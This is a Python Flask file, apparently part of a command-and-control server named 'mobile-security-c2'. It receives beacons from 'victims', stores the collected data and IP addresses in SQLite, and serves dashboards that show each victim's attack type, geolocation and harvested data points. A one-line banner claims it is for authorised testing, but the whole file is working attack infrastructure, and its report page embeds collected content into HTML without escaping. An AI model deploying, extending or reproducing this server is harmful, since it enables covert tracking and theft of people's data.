        data = request.get_json() or json.loads(request.data.decode('utf-8'))
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        
        victim_id = data.get('victim_id', f'beacon_{ip_address}')
        log_activity(f"📡 BEACON: Navigator beacon from {victim_id[:12]}...", ip_address)
        
        store_victim_data(victim_id, 'beacon_data', data, 'navigator_beacon', ip_address, 'Navigator Beacon', 'beacon')
        
        return '', 204
        
    except Exception as e:
        log_activity(f"❌ Error in beacon_endpoint: {e}")
        return '', 500

@app.route('/api/victims')
def api_victims():
    """Legacy API endpoint for backward compatibility"""
    try:
        dashboard_response = api_dashboard_data()
        dashboard_data = dashboard_response.get_json()
        
        return jsonify({
            'total': dashboard_data['stats']['total_victims'],
            'online': dashboard_data['stats']['online_victims'],
            'data_points': dashboard_data['stats']['total_data'],
            'victims': dashboard_data['victims']
        })
        
    except Exception as e:
        log_activity(f"❌ Error in api_victims: {e}")
        return jsonify({
            'error': 'Database error', 
            'message': str(e),
            'total': 0, 
            'online': 0, 
            'data_points': 0, 
            'victims': []
        }), 500

@app.route('/victim/<victim_id>')
def victim_details(victim_id):
    """Detailed victim information page"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM victims WHERE victim_id = ?', (victim_id,))
        victim = cursor.fetchone()
        
        if not victim:
            return f"<h1>Victim not found: {victim_id}</h1>", 404
        
        cursor.execute('''
            SELECT data_type, data_content, timestamp, source_url, severity
            FROM collected_data 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        data_points = cursor.fetchall()
        
        conn.close()
        
        # Generate enhanced HTML report
        html = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>🎯 Victim Analysis: {victim_id}</title>
            <style>
                body {{ font-family: 'Consolas', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }}
                .header {{ border: 2px solid #00ff41; padding: 20px; margin-bottom: 20px; border-radius: 10px; background: rgba(0, 255, 65, 0.1); }}
                .data-entry {{ background: #1a1a1a; border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; }}
                .timestamp {{ color: #888; font-size: 0.9em; }}
                .data-type {{ color: #ff6b6b; font-weight: bold; margin: 5px 0; }}
                .severity-high {{ color: #ff6b6b; font-weight: bold; }}
                .severity-medium {{ color: #ffaa00; }}
                .severity-low {{ color: #888; }}
                pre {{ background: #222; padding: 10px; border-radius: 5px; overflow-x: auto; color: #00ff41; }}
                button {{ background: #ff6b6b; color: #000; border: none; padding: 8px 15px; margin: 5px; cursor: pointer; border-radius: 5px; }}
                .back-btn {{ position: fixed; top: 20px; right: 20px; z-index: 1000; }}
                .info-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }}
                .info-box {{ background: rgba(0, 255, 65, 0.1); padding: 15px; border-radius: 10px; border: 1px solid #00ff41; }}
            </style>
        </head>
        <body>
            <div class="back-btn">
                <button onclick="window.close()">❌ Close</button>
                <button onclick="location.reload()">🔄 Refresh</button>
            </div>
            
            <div class="header">
                <h1>🎯 Fixed Victim Analysis Report</h1>
                <p><strong>Victim ID:</strong> {victim_id}</p>
                <div class="info-grid">
                    <div class="info-box">
                        <strong>Attack Type:</strong><br>{victim[7] if len(victim) > 7 else 'Unknown'}
                    </div>
                    <div class="info-box">
                        <strong>IP Address:</strong><br>{victim[6] if len(victim) > 6 else 'Unknown'}
                    </div>
                    <div class="info-box">
                        <strong>First Seen:</strong><br>{victim[3] if len(victim) > 3 else 'Unknown'}
                    </div>
                    <div class="info-box">
                        <strong>Last Activity:</strong><br>{victim[4] if len(victim) > 4 else 'Unknown'}
                    </div>
                    <div class="info-box">
                        <strong>Status:</strong><br>{victim[8] if len(victim) > 8 else 'Unknown'}
                    </div>
                    <div class="info-box">
                        <strong>Location:</strong><br>
                        {f"{victim[9]:.4f}, {victim[10]:.4f}" if len(victim) > 10 and victim[9] and victim[10] else "Unknown"}
                    </div>
                </div>
            </div>
            
            <h2>📊 Collected Data Points ({len(data_points)} total)</h2>
        '''
        
        for i, data_point in enumerate(data_points):
            data_type, content, timestamp, source_url, severity = data_point
            try:
                formatted_content = json.dumps(json.loads(content), indent=2)
            except:
                formatted_content = str(content)
            
            html += f'''
            <div class="data-entry" data-severity="{severity}">
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <div class="timestamp">🕒 {timestamp}</div>
                    <div class="severity-{severity}">{severity.upper()} SEVERITY</div>
                </div>
                <div class="data-type">📋 {data_type.upper()}</div>
                <div>📍 Source: {source_url}</div>
                <details style="margin-top: 10px;">
                    <summary style="cursor: pointer; color: #00ff41;">👁️ View Data Content</summary>
                    <pre>{formatted_content}</pre>
                </details>
            </div>
            '''
        
        html += '''
        </body>
        </html>
        '''
        
        return html
        
    except Exception as e:
        log_activity(f"❌ Error in victim_details: {e}")
        return f"<h1>Error loading victim details: {e}</h1>", 500

@app.route('/health')
def health_check():
    """Enhanced health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'service': 'mobile-security-c2',
        'timestamp': datetime.now().isoformat(),
        'version': '2.1.0-database-fixed',
        'features': [
            'Fixed Database Storage',
            'Improved Error Handling',
            'Advanced Dashboard',
            'Real-time Monitoring', 
            'Data Export',
            'Victim Management'
        ]
    })

@app.route('/debug/db')
def debug_database():
    """Enhanced debug endpoint"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Check tables
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = cursor.fetchall()
        
        # Count records in each table
        counts = {}
        for table in tables:
            try:
                cursor.execute(f'SELECT COUNT(*) FROM {table[0]}')
                counts[table[0]] = cursor.fetchone()[0]
            except Exception as e:
                counts[table[0]] = f'Error: {e}'
        
        # Get recent activity
        try:
            cursor.execute('SELECT data_type, COUNT(*) FROM collected_data GROUP BY data_type')
            data_types = dict(cursor.fetchall())
        except:
            data_types = {}
        
        try:
            cursor.execute('SELECT attack_type, COUNT(*) FROM victims GROUP BY attack_type')
            attack_types = dict(cursor.fetchall())
        except:
            attack_types = {}
        
        conn.close()
        
        return jsonify({
            'database_file': DATABASE,
            'tables': [table[0] for table in tables],
            'record_counts': counts,
            'data_types': data_types,
            'attack_types': attack_types,
            'status': 'ok',
            'version': '2.1.0-database-fixed'
        })
        
    except Exception as e:
        return jsonify({
            'error': str(e),
            'status': 'error'
        }), 500

def print_startup_banner():
    """Enhanced startup banner"""
    print("=" * 70)
    print("🎯 FIXED ADVANCED MOBILE SECURITY C&C SERVER")
    print("=" * 70)
    print("🚅 Platform: Railway")
    print("📡 Status: ONLINE")
    print(f"🌐 Port: {PORT}")
    print("💾 Database: SQLite (Fixed Schema)")
    print("🔧 Version: 2.1.0-database-fixed")
    print("=" * 70)
    print("🛠️  DATABASE FIXES:")
    print("  ✅ Fixed Database Schema Issues")
    print("  ✅ Improved Error Handling")
    print("  ✅ Safe Data Insertion")
    print("  ✅ Better Connection Management")
    print("  ✅ Robust Fallback Values")
    print("=" * 70)
    print("🚀 FEATURES:")
    print("  ✅ Advanced Dashboard")
    print("  ✅ Real-time Victim Monitoring")
    print("  ✅ Data Export (CSV/JSON)")
    print("  ✅ Enhanced Victim Profiles")
    print("  ✅ Auto-refresh Dashboard")
    print("=" * 70)
    print("📱 Available Endpoints:")
    print("  GET  /              - Fixed Dashboard")
    print("  POST /collect       - Fixed Data Collection")
    print("  GET  /api/dashboard-data - Dashboard Data")
    print("  GET  /api/export/<type> - Data Export")
    print("  GET  /health        - Health Check")
    print("  GET  /debug/db      - Database Debug")
    print("=" * 70)
    print("⚠️  FOR AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 70)

if __name__ == '__main__':
    # Initialize fixed database
    init_success = init_db()
    
    if not init_success:
        print("❌ Failed to initialize database, continuing anyway...")
    
    # Print startup banner
    print_startup_banner()
    
    # Start server
    app.run(
        host='0.0.0.0',
        port=PORT,
        debug=False,
        threaded=True
    )
